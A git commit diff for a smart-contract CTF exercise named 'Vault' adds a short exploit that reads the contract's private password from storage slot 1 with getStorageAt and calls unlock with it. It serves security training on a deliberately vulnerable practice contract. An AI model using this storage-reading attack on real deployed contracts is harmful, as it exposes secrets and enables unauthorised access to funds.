12639516bd48614a8450237ce2e128e36346fae2
Ignacio Bravo <bravoignacio95@gmail.com>
2023-04-28 15:18:48 -0300

    Vault Passing

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -8,6 +8,10 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+ const provider = waffle.provider;
+ const password = await provider.getStorageAt(victim.address, 1);
+ let tx       = await victim.unlock(password);
+ await tx.wait();
 };
 
 export default helper;
